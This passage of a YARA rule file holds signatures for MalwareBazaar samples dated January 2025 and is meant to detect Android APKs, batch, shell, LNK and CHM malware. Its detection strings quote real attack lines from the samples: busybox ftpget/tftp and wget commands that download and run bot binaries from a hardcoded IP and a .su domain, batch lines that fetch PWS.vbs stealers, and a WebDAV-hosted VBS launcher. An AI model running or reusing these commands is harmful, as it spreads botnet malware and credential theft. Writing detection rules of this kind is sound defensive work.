      $s16 = "xl/printerSettings/printerSettings8.bin" fullword ascii
      $s17 = "xl/printerSettings/printerSettings11.bin" fullword ascii
      $s18 = "xl/printerSettings/printerSettings3.bin" fullword ascii
      $s19 = "<key>com.apple.print.PageFormat.PMHorizontalRes</key>" fullword ascii
      $s20 = "<key>com.apple.print.PageFormat.PMAdjustedPageRect</key>" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 1000KB and
      8 of them
}

rule f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81bfd799 {
   meta:
      description = "evidences - file f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81bfd799.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "f384e1c2ac627fdfabaef3401c1b457e2b08830eaf91a6c544328f1f81bfd799"
   strings:
      $s1 = "com.hackwats.darkman" fullword wide
      $s2 = "colorPrimaryDark" fullword ascii
      $s3 = "uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu" ascii
      $s4 = "AndroidManifest.xmlPK" fullword ascii
      $s5 = "resources.arsc" fullword ascii
      $s6 = "res/drawable-xhdpi-v4/default_image.png" fullword ascii
      $s7 = "res/drawable-xhdpi-v4/app_icon.png" fullword ascii
      $s8 = "res/layout/main.xml" fullword ascii
      $s9 = "''res/drawable-xhdpi-v4/default_image.png" fullword ascii
      $s10 = "\"\"res/drawable-xhdpi-v4/app_icon.png" fullword ascii
      $s11 = "res/layout/aaa.xml" fullword ascii
      $s12 = "res/layout/ccc.xml" fullword ascii
      $s13 = "res/layout/bbb.xml" fullword ascii
      $s14 = "res/layout/ddd.xml" fullword ascii
      $s15 = "Lvuvnkv" fullword ascii
      $s16 = "linear1" fullword ascii
      $s17 = "l- Iq&(" fullword ascii
      $s18 = "Vg71* " fullword ascii
      $s19 = "0+ T3c" fullword ascii
      $s20 = "w* $`4" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 2000KB and
      8 of them
}

rule sig_4ee8ee83ac78c71e084cb42d28158b8fee1ec32b580dd9c9decd89f6579d49bf {
   meta:
      description = "evidences - file 4ee8ee83ac78c71e084cb42d28158b8fee1ec32b580dd9c9decd89f6579d49bf.apk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "4ee8ee83ac78c71e084cb42d28158b8fee1ec32b580dd9c9decd89f6579d49bf"
   strings:
      $s1 = "android@android.com" fullword ascii
      $s2 = "android@android.com0" fullword ascii
      $s3 = "2jfEX:\\" fullword ascii
      $s4 = "assets/private.aes<" fullword ascii
      $s5 = "com.crypto.coldMinnerPro1" fullword wide
      $s6 = "colorPrimaryDark" fullword ascii
      $s7 = "drawable" fullword wide
      $s8 = "resources.arscPK" fullword ascii
      $s9 = "resources.arsc" fullword ascii
      $s10 = "res/drawable-xhdpi-v4/default_image.png" fullword ascii
      $s11 = "res/layout/splash.xml" fullword ascii
      $s12 = "META-INF/TESTKEY.RSAPK" fullword ascii
      $s13 = "res/drawable-xhdpi-v4/app_icon.png" fullword ascii
      $s14 = "res/layout/main.xml" fullword ascii
      $s15 = "''res/drawable-xhdpi-v4/default_image.png" fullword ascii
      $s16 = "assets/private.aesPK" fullword ascii
      $s17 = "\"\"res/drawable-xhdpi-v4/app_icon.png" fullword ascii
      $s18 = "META-INF/TESTKEY.SF" fullword ascii
      $s19 = "META-INF/TESTKEY.RSA3hb" fullword ascii
      $s20 = "META-INF/TESTKEY.SFPK" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      8 of them
}

rule sig_6c268d444cb90304d9d371318d6a84b1dee5ac31028fdb00139689d270097179 {
   meta:
      description = "evidences - file 6c268d444cb90304d9d371318d6a84b1dee5ac31028fdb00139689d270097179.bat"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "6c268d444cb90304d9d371318d6a84b1dee5ac31028fdb00139689d270097179"
   strings:
      $s1 = ":~26,1%=%APPDATA%\\%" fullword ascii
      $s2 = ":~42,1%'%USERPROFILE%\\%" fullword ascii
      $s3 = ":~42,1%\"%Userprofile%\\%" fullword ascii
      $s4 = ":~56,1%=%USERPROFILE%\\%" fullword ascii
      $s5 = ":~3,1%=%USERPROFILE%\\%" fullword ascii
      $s6 = ":~42,1%(\"%USERPROFILE%\\%" fullword ascii
      $s7 = ":~32,1%=%USERPROFILE%\\%" fullword ascii
      $s8 = "RC%=%USERPROFILE%\\%" fullword ascii
      $s9 = ":~42,1%\"%USERPROFILE%\\%" fullword ascii
      $s10 = "%=%USERPROFILE%\\%" fullword ascii
      $s11 = ":~4,1%://jsnybsafva.info:2030/startupppp.bat\"" fullword ascii
      $s12 = "%\"%cmdDestination%\"%" fullword ascii
      $s13 = ":~4,1%://jsnybsafva.info:2030/PWS.vbs\"" fullword ascii
      $s14 = ":~42,1%'%cmdDestination%'%" fullword ascii
      $s15 = ":~42,1%%ERRORLEVEL%%" fullword ascii
      $s16 = ":~42,1%'%cmdUrl%'%" fullword ascii
      $s17 = ":~4,1%://jsnybsafva.info:2030/PWS1.vbs\"" fullword ascii
      $s18 = ":~42,1%%errorlevel%==%" fullword ascii
      $s19 = ":~3,1%\\%" fullword ascii /* hex encoded string '1' */
      $s20 = ":~42,1%'%destination%'%" fullword ascii
   condition:
      uint16(0) == 0xfeff and filesize < 100KB and
      8 of them
}

rule sig_6f6d384d860c04de82e89edea13e529762e45ff21cda45aac4d292d8c2491a94 {
   meta:
      description = "evidences - file 6f6d384d860c04de82e89edea13e529762e45ff21cda45aac4d292d8c2491a94.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "6f6d384d860c04de82e89edea13e529762e45ff21cda45aac4d292d8c2491a94"
   strings:
      $s1 = "/bin/busybox ftpget 185.142.53.190 ppc ppc;chmod 777 ppc;./ppc selfrep.ppc.ftpget;rm -rf ppc;" fullword ascii
      $s2 = "/bin/busybox ftpget 185.142.53.190 arm arm;chmod 777 arm;./arm selfrep.arm.ftpget;rm -rf arm;" fullword ascii
      $s3 = "/bin/busybox ftpget 185.142.53.190 arc arc;chmod 777 arc;./arc selfrep.arc.ftpget;rm -rf arc;" fullword ascii
      $s4 = "/bin/busybox ftpget 185.142.53.190 arm7 arm7;chmod 777 arm7;./arm7 selfrep.arm7.ftpget;rm -rf arm7;" fullword ascii
      $s5 = "/bin/busybox ftpget 185.142.53.190 sh4 sh4;chmod 777 sh4;./sh4 selfrep.sh4.ftpget;rm -rf sh4;" fullword ascii
      $s6 = "/bin/busybox ftpget 185.142.53.190 mpsl mpsl;chmod 777 mpsl;./mpsl selfrep.mpsl.ftpget;rm -rf mpsl;" fullword ascii
      $s7 = "/bin/busybox ftpget 185.142.53.190 arm5 arm5;chmod 777 arm5;./arm5 selfrep.arm5.ftpget;rm -rf arm5;" fullword ascii
      $s8 = "/bin/busybox ftpget 185.142.53.190 mips mips;chmod 777 mips;./mips selfrep.mips.ftpget;rm -rf mips;" fullword ascii
   condition:
      uint16(0) == 0x622f and filesize < 2KB and
      all of them
}

rule sig_7d2377557c020783185b23a13d6e30fa3bb3f012d8f524f31c3dbb4dcb02bafc {
   meta:
      description = "evidences - file 7d2377557c020783185b23a13d6e30fa3bb3f012d8f524f31c3dbb4dcb02bafc.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "7d2377557c020783185b23a13d6e30fa3bb3f012d8f524f31c3dbb4dcb02bafc"
   strings:
      $s1 = "=F:\\Ny])" fullword ascii
      $s2 = "#0.Pfa" fullword ascii
      $s3 = "kwsk}wS" fullword ascii
      $s4 = "$ziSi7Og" fullword ascii
      $s5 = "qALgtj&" fullword ascii
      $s6 = "ayfn(t!4" fullword ascii
      $s7 = "Vc^skPv\"Xh\"" fullword ascii
      $s8 = "JsJ\\iN{n" fullword ascii
      $s9 = "wd7(r3I4" fullword ascii
      $s10 = "zHAETZ" fullword ascii
      $s11 = "UGDJi`" fullword ascii
      $s12 = "J +0L1" fullword ascii
      $s13 = ">Lo7{F" fullword ascii
      $s14 = "=>G.a3" fullword ascii
      $s15 = ".,pmEN" fullword ascii
      $s16 = "K.gvKx" fullword ascii
      $s17 = "Ggf|wM" fullword ascii
      $s18 = "|s7I|:" fullword ascii
      $s19 = "P$\"lyF" fullword ascii
      $s20 = "jvo5/_k" fullword ascii
   condition:
      uint16(0) == 0x9c78 and filesize < 80KB and
      8 of them
}

rule sig_7ea4b159b8125eaeae5bd2bae72b3d00c2f8fc55a0a83403305dc1222fc27055 {
   meta:
      description = "evidences - file 7ea4b159b8125eaeae5bd2bae72b3d00c2f8fc55a0a83403305dc1222fc27055.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "7ea4b159b8125eaeae5bd2bae72b3d00c2f8fc55a0a83403305dc1222fc27055"
   strings:
      $s1 = "wget http://dihvbe.theeyefirewall.su/vevhea4; chmod 777 vevhea4; ./vevhea4 telnet" fullword ascii
      $s2 = "wget http://dihvbe.theeyefirewall.su/qbfwdbg; chmod 777 qbfwdbg; ./qbfwdbg telnet" fullword ascii
      $s3 = "wget http://dihvbe.theeyefirewall.su/ngwa5; chmod 777 ngwa5; ./ngwa5 telnet" fullword ascii
      $s4 = "wget http://dihvbe.theeyefirewall.su/fqkjei686; chmod 777 fqkjei686; ./fqkjei686 telnet" fullword ascii
      $s5 = "wget http://dihvbe.theeyefirewall.su/wlw68k; chmod 777 wlw68k; ./wlw68k telnet" fullword ascii
      $s6 = "wget http://dihvbe.theeyefirewall.su/debvps; chmod 777 debvps; ./debvps telnet" fullword ascii
      $s7 = "wget http://dihvbe.theeyefirewall.su/wrjkngh4; chmod 777 wrjkngh4; ./wrjkngh4 telnet" fullword ascii
      $s8 = "wget http://dihvbe.theeyefirewall.su/ivwebcda7; chmod 777 ivwebcda7; ./ivwebcda7 telnet" fullword ascii
      $s9 = "wget http://dihvbe.theeyefirewall.su/fbhervbhsl; chmod 777 fbhervbhsl; ./fbhervbhsl telnet" fullword ascii
      $s10 = "wget http://dihvbe.theeyefirewall.su/jefne64; chmod 777 jefne64; ./jefne64 telnet" fullword ascii
      $s11 = "wget http://dihvbe.theeyefirewall.su/gnjqwpc; chmod 777 gnjqwpc; ./gnjqwpc telnet" fullword ascii
      $s12 = "wget http://dihvbe.theeyefirewall.su/woega6; chmod 777 woega6; ./woega6 telnet" fullword ascii
      $s13 = "wget http://dihvbe.theeyefirewall.su/wev86; chmod 777 wev86; ./wev86 telnet" fullword ascii
   condition:
      uint16(0) == 0x6777 and filesize < 3KB and
      8 of them
}

rule sig_9327933f4ce2d9485e98192cffc35d127e85bf0db77dc37ba595305760e31611 {
   meta:
      description = "evidences - file 9327933f4ce2d9485e98192cffc35d127e85bf0db77dc37ba595305760e31611.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "9327933f4ce2d9485e98192cffc35d127e85bf0db77dc37ba595305760e31611"
   strings:
      $x1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "G0IgSAAIFggACcABCggACASBOIQACASBI0TgSIwBGETgSUiEBAwB1EYEBEAIG4gDO4wAAYQKBGRABAgBZEYEZEYEdEYECAwCZEYEAAQBNAAIDgQHBGRGBGBCEcgCVEoE" ascii
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ' */
      $s6 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s7 = "AEAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @                  ' */
      $s8 = "AAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */
      $s9 = "AAAAAAAAAAB" ascii /* base64 encoded string '        ' */
      $s10 = "////fjDAAAQB4AAAAUQOB4/FGAgCXAAAAAwA5Eg/WYAAAAAAcgjCWAAAAAAOmAAAAAwOsPyYhAAAAAAOmAAAAAwVs9UMhEBAAgAAAAQSAIAMTAAAAoiOf8////NOAAAA" ascii
      $s11 = "EkTA+rhERAgETIxHLklaXYAAPcNKYgVGpNgAAAAATkTA+HxHSEBASMxFf8//5PEOAAAAJkTA+bxHSEBASMxGfcwEGAwDXjCGYpFGpZQEY5RaDIAAAAwF5Eg/a8hERAgE" ascii
      $s12 = "RAgETshBTQQEAAAAHkTA+rhERAAAAAAx4IxEWAAAAAAOmAAAAAgQxOLNhAAAAAAOmAAAAAgZehBphEBAA4AAAAg8AIAMToiCR8///HHOAAAAFgDAAAQB5Eg/dwQEAwwE" ascii
      $s13 = "Yp2FHIAAAAQF5Eg/X8hERAgETgRDRS9AEAAAAunAAAAANkTA+fhERAgETgyHAAgA0hDAAAQC5Eg/n8hERAgET0wHGAwDVjiWEAAABunAZp2FGAwDXjiGphlbFExACIAA" ascii
      $s14 = "HkTA+zhERAgETshBTQQEAAAAHkTA+rhERAgETowHQMhDRAAAAgQOB4fCfIREAIxEaQwEIAAAAYQOB4fGSEBASMRGMYAAAAQB5Eg/YIREAIxEJ8hDTwQEAAAAIkTA+7hE" ascii
      $s15 = "JkTA+fhERAgETkwHOMBDRAAAAgQOB4vHSEBASMhHMMhCRAAAAcQOB4fHSEBASMRGMYAAAAQB5Eg/YIREAIxEcgwEGEBAAAwB5Eg/bIREAIxEbYwEEEBAAAwB5Eg/aIRE" ascii
      $s16 = "RAgETwBCTYQEAAAAHkTA+vhERAgETkBDGAAAAUQOB4PGSEBASMhHMMhCRAAAAcQOB4fHSEBASMxGGMBBRAAAAcQOB4vGSEBASMhCfAxEOEBAAAAC5Eg/J8hERAAAAAAx" ascii
      $s17 = "cIREAIxEJ8hDTwQEAAAAIkTA+7hERAgEToBBTgAAAAgB5Eg/ZIREAIxEZwgBAAAAFkTA+jhERAgETowHQMhDRAAAAgQOB4fCfIREAAAAAQMOSMhFAAAAAgjJAAAAAEGi" ascii
      $s18 = "AQAAAAgvAIAMTAAAqARE////3gDAAAQB4AAAAUQOB4vCfIREAIxEXAAAAAAB5Eg/WIREAIxEZwgBAAAAFkTA+jhERAgETwBCTYQEAAAAHkTA+vhERAgETshBTQQEAAAA" ascii
      $s19 = "GEBAAAwB5Eg/bIREAIxEbYwEEEBAAAwB5Eg/aIREAIxEZwgBAAAAFkTA+jhERAgETkwHOMBDRAAAAgQOB4vHSEBASMBGKYAAD4PKAAAAJkTA+fhERAgETowHQMhDRAAA" ascii
      $s20 = "J8hERAgETkwHOMBDRAAAAgQOB4vHSEBASMRGMYAAAAQB5Eg/YIREAAAAAQMOSMhFAAAAAgjJAAAAAohnQIcIAAAAAgjJUEBAA4AAAAg6AIAMTAAAq4QE////LhDAAAQB" ascii
   condition:
      uint16(0) == 0x3d3d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule effdd3d663e7ae08ee64667d92e2866d7996db3d213458dc5837f6c732ac1388 {
   meta:
      description = "evidences - file effdd3d663e7ae08ee64667d92e2866d7996db3d213458dc5837f6c732ac1388.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "effdd3d663e7ae08ee64667d92e2866d7996db3d213458dc5837f6c732ac1388"
   strings:
      $x1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ' */
      $s5 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s6 = "EAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '              ' */
      $s7 = "AAAAAAAAAAAAAC" ascii /* base64 encoded string '          ' */
      $s8 = "DAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '               ' */
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAE" ascii /* base64 encoded string '                   ' */
      $s10 = "AAAAAEAAAAAAAAA" ascii /* base64 encoded string '    @      ' */
      $s11 = "AEBAAAAAAAAAAAA" ascii /* base64 encoded string ' @@        ' */
      $s12 = "AAAAAAAAAADAA" ascii /* base64 encoded string '       0 ' */
      $s13 = "uMHbvN2b09mcQ5yclNWa2JXZT5iYldlLtVGdzl3U0AQAh5gDO4QAEAyBA4RAHQAAeEgCEAgHAEAEF4QAHMQFSEwBEEXEVIRAAYACBcwACEwBDwBHBAABAAgclRXdw12b" ascii
      $s14 = "TRjNlNXYC12byZEA0JXZ252bDBgb39GZ0VHaTBgb39GZ0VHaTRXZrN2bTBAdyFGdzVmUAMXby9mRuM3dvRmbpdlLtVGdzl3UAQ2boRXZNVmchBXbvNEAzdmbpJHdTBAc" ascii
      $s15 = "F8qcoMjFKAAALhiFwBQBvK3ERAAACILOGAAAmgCcAUQpy9wMWoAAAsEKWAHAFUqcTEBAAIQ04Ag3KAAAlgiBAAgJooAAAICKKAAAQiiCAAAlvhQEKAAAQiCBAAAH+pAA" ascii
      $s16 = "A0DAnBQeAADAGBQOAsEApBAZAEEACBgSAMDAzBARAQGAFBwbAQFA1AgWAUFA2EDAA0DA9AwZAMGAuBANAkEAKBgaAEEAGBgYAEHALBAbAwGAGBQUA4GAoBQRAsGApBwK" ascii
      $s17 = "bAAAAAAAAA" ascii /* base64 encoded string 'l      ' */
      $s18 = "f1URUNVWT91UFBARFJVSVFVRS9VWBxEUTlERfNVRAMVVPVlTJRlTPN0XTVEAf9VZ1xWY2BQb15WRAUWbpR1dkBQZ6l2UiNGAlBXeUVWdsFmVAU2avZnbJBAdsV3clJ1Y" ascii
      $s19 = "BYjARQw1MEVAZAQxPofAJRAyPsnABQQwBYjABQwuPwUA5TQrPQRAxHQ9O4fApTwmC0UAZTQlOceAhLgnBYTARTQhMEVAZAQcC0UAJHwBOMaAJBQcOMZABTwfOUYAJRQe" ascii
      $s20 = "v5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4guf4AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAgLAA8//AAAAEAAAAMAAQqVT" ascii
   condition:
      uint16(0) == 0x4141 and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_9a95b6e4af39357ed6d445823504f33c47b965669af668c3536557b7c0b6c403 {
   meta:
      description = "evidences - file 9a95b6e4af39357ed6d445823504f33c47b965669af668c3536557b7c0b6c403.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "9a95b6e4af39357ed6d445823504f33c47b965669af668c3536557b7c0b6c403"
   strings:
      $x1 = "/bin/busybox tftp -g 185.142.53.190 -r ppc -l -> ppc;chmod 777 ppc;./ppc selfrep.ppc.tftp;rm -rf ppc;" fullword ascii
      $x2 = "/bin/busybox tftp -g 185.142.53.190 -r arm -l -> arm;chmod 777 arm;./arm selfrep.arm.tftp;rm -rf arm;" fullword ascii
      $x3 = "/bin/busybox tftp -g 185.142.53.190 -r arc -l -> arc -b 512;chmod 777 arc;./arc selfrep.arc.tftp;rm -rf arc;" fullword ascii
      $s4 = "/bin/busybox tftp -g 185.142.53.190 -r arm7 -l -> arm7;chmod 777 arm7;./arm7 selfrep.arm7.tftp;rm -rf arm7;" fullword ascii
      $s5 = "/bin/busybox tftp -g 185.142.53.190 -r mips -l -> mips;chmod 777 mips;./mips selfrep.mips.tftp;rm -rf mips;" fullword ascii
      $s6 = "/bin/busybox tftp -g 185.142.53.190 -r sh4 -l -> sh4;chmod 777 sh4;./sh4 selfrep.sh4.tftp;rm -rf sh4;" fullword ascii
      $s7 = "/bin/busybox tftp -g 185.142.53.190 -r arm5 -l -> arm5;chmod 777 arm5;./arm5 selfrep.arm5.tftp;rm -rf arm5;" fullword ascii
      $s8 = "/bin/busybox tftp -g 185.142.53.190 -r mpsl -l -> mpsl;chmod 777 mpsl;./mpsl selfrep.mpsl.tftp;rm -rf mpsl;" fullword ascii
   condition:
      uint16(0) == 0x622f and filesize < 2KB and
      1 of ($x*) and all of them
}

rule a8c5f536fc0f074a06771ff7e76ab46eadf7656431478496b523c89189a26597 {
   meta:
      description = "evidences - file a8c5f536fc0f074a06771ff7e76ab46eadf7656431478496b523c89189a26597.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "a8c5f536fc0f074a06771ff7e76ab46eadf7656431478496b523c89189a26597"
   strings:
      $s1 = "VVVVVUP" fullword ascii
      $s2 = "xuUS04Y<" fullword ascii
      $s3 = "fXzTL_6" fullword ascii
      $s4 = "qXCIpg." fullword ascii
      $s5 = "\\'6{,m" fullword ascii
      $s6 = "IlxO07" fullword ascii
      $s7 = "D$4PQQQ" fullword ascii /* Goodware String - occured 3 times */
      $s8 = "\\SE9A}" fullword ascii
      $s9 = "1EQq1U" fullword ascii
      $s10 = "/V}d~kl" fullword ascii
      $s11 = "%eAKn+" fullword ascii
      $s12 = " \" iS|" fullword ascii
      $s13 = "$EAEDw" fullword ascii
      $s14 = "B\"m'E^" fullword ascii
      $s15 = "D$4Wj<3" fullword ascii
      $s16 = "SR%{zW" fullword ascii
      $s17 = ",eJyAf" fullword ascii
      $s18 = "sP\"=|SS~" fullword ascii
      $s19 = "2g/ZC_" fullword ascii
      $s20 = "4OM\\<S" fullword ascii
   condition:
      uint16(0) == 0xc0e8 and filesize < 200KB and
      8 of them
}

rule ad57b4d8ab53fd72703908dbbca815d93a6b9a77c7f388c0168d0d34120d6136 {
   meta:
      description = "evidences - file ad57b4d8ab53fd72703908dbbca815d93a6b9a77c7f388c0168d0d34120d6136.chm"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "ad57b4d8ab53fd72703908dbbca815d93a6b9a77c7f388c0168d0d34120d6136"
   strings:
      $s1 = "HHA Version 4.74.8702" fullword ascii
      $s2 = "<(::DataSpace/Storage/MSCompressed/Content" fullword ascii
      $s3 = "hhctest" fullword ascii
      $s4 = "\\,::DataSpace/Storage/MSCompressed/ControlData" fullword ascii
      $s5 = "/$WWKeywordLinks/Property" fullword ascii
      $s6 = "/$WWKeywordLinks/" fullword ascii
      $s7 = ")::DataSpace/Storage/MSCompressed/SpanInfo" fullword ascii
      $s8 = "<&_::DataSpace/Storage/MSCompressed/Transform/{7FC28940-9D31-11D0-9B27-00A0C91E9C7C}/InstanceData/" fullword ascii
      $s9 = "/::DataSpace/Storage/MSCompressed/Transform/List" fullword ascii
      $s10 = "i::DataSpace/Storage/MSCompressed/Transform/{7FC28940-9D31-11D0-9B27-00A0C91E9C7C}/InstanceData/ResetTable" fullword ascii
      $s11 = "calc.htm" fullword ascii
      $s12 = "RjzdS\\$" fullword ascii
      $s13 = "/$OBJINST" fullword ascii
      $s14 = "/#STRINGS" fullword ascii /* Goodware String - occured 1 times */
      $s15 = "`mqk.LtK" fullword ascii
      $s16 = "/$WWAssociativeLinks/" fullword ascii
      $s17 = "/$FIftiMain" fullword ascii
      $s18 = "vmaG^V5" fullword ascii
      $s19 = "OhXAD3S" fullword ascii
      $s20 = "/#SYSTEM" fullword ascii /* Goodware String - occured 1 times */
   condition:
      uint16(0) == 0x5449 and filesize < 200KB and
      8 of them
}

rule b21a36ba6d6e00227ead0ef1033950b7ab13ae7f8cca9a5b91df1b7bb15d6f4e {
   meta:
      description = "evidences - file b21a36ba6d6e00227ead0ef1033950b7ab13ae7f8cca9a5b91df1b7bb15d6f4e.lnk"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "b21a36ba6d6e00227ead0ef1033950b7ab13ae7f8cca9a5b91df1b7bb15d6f4e"
   strings:
      $s1 = "\\\\scan-interpreted-roman-glad.trycloudflare.com@SSL\\DavWWWRoot" fullword ascii
      $s2 = "\\\\scan-interpreted-roman-glad.trycloudflare.com@SSL\\DavWWWRoot\\new.vbs" fullword wide
      $s3 = "\\\\SCAN-INTERPRETED-ROMAN-GLAD.TRYCLOUDFLARE.COM@SSL\\DAVWWWROOT" fullword ascii
      $s4 = "scan-interpreted-roman-glad.trycloudflare.com@SSL" fullword wide
      $s5 = "new.vbs" fullword wide
      $s6 = "s9%ProgramFiles(x86)%\\Microsoft\\Edge\\Application\\msedge.exe" fullword wide
      $s7 = "Web Client Network" fullword wide /* Goodware String - occured 2 times */
      $s8 = "1SPSsC" fullword ascii
      $s9 = "1SPSU(L" fullword ascii
      $s10 = "S-1-5-21-1171917858-701188650-985899978-500" fullword wide
      $s11 = "MSEdge" fullword wide
   condition:
      uint16(0) == 0x004c and filesize < 5KB and
      8 of them
}

rule b8f373b493c42f383fe37d4bf00db4e896555a8417ede32592bfac77f5c6bd29 {
   meta:
      description = "evidences - file b8f373b493c42f383fe37d4bf00db4e896555a8417ede32592bfac77f5c6bd29.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "b8f373b493c42f383fe37d4bf00db4e896555a8417ede32592bfac77f5c6bd29"
   strings:
      $s1 = "x00\\x00\\x00\"\"\\x01\\x38\\x83\\xE1\\x00\\x3C\\x83\\xE1\\x02\\x34\\x83\\xE1\\x03\\x0C\\xA0\\xE1\\x02\\x08\\x80\\xE1\\xFF\\x28" ascii
      $s2 = "0\\xA0\\xE1\\x01\\x00\\xA0\\x03\\x90\\xFF\\xFF\\x0B\"\"\\x05\\x00\\xA0\\xE1\\x84\\x10\\x8D\\xE2\\x10\\x20\\xA0\\xE3\\xA7\\xFF\\x" ascii
      $s3 = "5\\x00\\xA0\\xE1\\xC0\\x10\\x9F\\xE5\\x04\\x20\\xA0\\xE1\"\"\\xA6\\xFF\\xFF\\xEB\\x04\\x00\\x50\\xE1\\x03\\x00\\xA0\\x13\\x7C\\x" ascii
      $s4 = "0\\x00\\x00\"\"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x" ascii
      $s5 = "xC0\\xA0\\xE1\\xF0\\x00\\x2D\\xE9\\x00\\x70\\xA0\\xE1\\x01\\x00\\xA0\\xE1\"\"\\x02\\x10\\xA0\\xE1\\x03\\x20\\xA0\\xE1\\x78\\x00" ascii
      $s6 = "9\\x00\\x01\\x09\\x00\\x00\\x00\\x06\\x02\\x08\\x01\\x00\\x2E\\x73\\x68\\x73\\x74\\x72\\x74\"\"\\x61\\x62\\x00\\x2E\\x74\\x65\\x" ascii
      $s7 = "0\\x0F\\x0A\\xE0\\xE3\\x1F\\xF0\\x40\\xE2\\x00\\x00\\xA0\\xE1\\x00\\x00\\xA0\\xE1\"\"\\x61\\x72\\x6D\\x37\\x00\\x00\\x00\\x00\\x" ascii
      $s8 = "x10\\xA0\\xE1\\x04\\xD0\\x4D\\xE2\"\"\\x0C\\x20\\xA0\\xE1\\x03\\x00\\xA0\\xE3\\x78\\x00\\x00\\xEB\\x04\\xD0\\x8D\\xE2\\x04\\xE0" ascii
